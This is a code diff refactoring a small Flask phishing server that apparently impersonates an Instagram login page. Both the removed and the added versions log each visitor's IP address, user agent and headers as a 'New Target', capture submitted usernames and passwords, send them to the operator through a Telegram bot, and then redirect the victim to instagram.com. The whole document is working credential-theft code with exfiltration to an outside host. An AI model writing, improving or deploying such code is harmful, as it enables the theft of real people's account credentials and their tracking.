@@ -1,77 +1,55 @@
-try:
-    from flask import *
-
-    from flask_limiter import *
-
-    from flask_limiter.util import get_remote_address
-
-    import requests , time
-
-except ImportError:
-
-    exit("install requests and try again ...(pip install -r requirements.txt")
-    
-import config 
-app = Flask(
-    __name__,
-    static_folder='static',
-    template_folder='template'
+from flask import (
+    Flask as Flask,
+    request as FlaskRequest,
+    redirect as FlaskRedirect,
+    render_template as FlaskRenderTemplate
 )
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+import requests
+import time
+import config
 
-limiter = Limiter(
-    get_remote_address,
-    app=app
-)
+class UserDataHandler:
+    def __init__(self):
+        self.app = Flask(__name__, static_folder='static', template_folder='template')
+        self.limiter = Limiter(get_remote_address, app=self.app)
+        self.app.add_url_rule('/', 'index', self.__INDEX__, methods=['GET'])
+        self.app.add_url_rule('/login', 'get_data', self.__GET_DATA__, methods=['POST'])
 
-def send_data(username , password):
-    datas = f"""
-    🎉The user has entered The information
-    \n💌 USER NAME : {username}
-    
-    \n❗ PASSWORD : {password}
-    
+    def __SEND_DATA__(self, username, password):
+        data = f"""
+        🎉 The user has entered the information
+        \n💌 USER NAME: {username}
+        \n❗ PASSWORD: {password}
+        \n🕛 Time: {time.strftime("%H:%M:%S")}
+        \n⚜ Coded By: @zelroth
+        """
+        requests.get(f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage?chat_id={config.ADMIN}&text={data}')
 
-    🕛 Time : {time.strftime("%H : %M : %S")}
-    
-    \n⚜ Coded By : @zelroth
+    def __SEND_IP__(self):
+        data = f"""
+        New Target Added 💘
+        \n⭕ IP: {FlaskRequest.remote_addr}
+        \n🎃 User-Agent: {FlaskRequest.user_agent}
+        \n🔱 Headers:\n {FlaskRequest.headers}
+        \n🕛 Date: {time.strftime("%H:%M:%S")}
+        \n⚜ Coded By: @zelroth
+        """
+        requests.get(f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage?chat_id={config.ADMIN}&text={data}')
 
-    """
-    requests.get(f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage?chat_id={config.ADMIN}&text={datas}')
-   
-def send_ip(request):
-    
-    datas = f"""
-    New Target Added 💘
-    
-    \n⭕ IP : {request.remote_addr}
-    
-    \n🎃 User-Agent : {request.user_agent}
-    
-    \n🔱 Headers :\n {request.headers}
-    
-    \n🕛 Date : {time.strftime("%H : %M : %S")}
-    
-    \n⚜ Coded By : @zelroth
-    
-    """
-    requests.get(f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage?chat_id={config.ADMIN}&text={datas}')
-    
+    @limiter.limit('3/minute')
+    def __INDEX__(self):
+        self.__SEND_IP__()
+        return FlaskRenderTemplate('login.html')
 
-@app.route('/' , methods=['GET'])
-@limiter.limit('3/minute')
-def index():
-    send_ip(request)
-    return render_template('login.html')
-
-@app.route('/login' , methods=['POST'])
-@limiter.limit('3/minute')
-def get_data():
-    username = request.form['username']
-    password = request.form['password']
-    send_data(username , password)
-    return redirect('https://instagram.com')
-
-
+    @limiter.limit('3/minute')
+    def __GET_DATA__(self):
+        username = FlaskRequest.form['username']
+        password = FlaskRequest.form['password']
+        self.__SEND_DATA__(username, password)
+        return FlaskRedirect('https://instagram.com')
 
 if __name__ == "__main__":
-    app.run('0.0.0.0' , 8022)
+    handler = UserDataHandler()
+    handler.app.run('0.0.0.0', 8022)
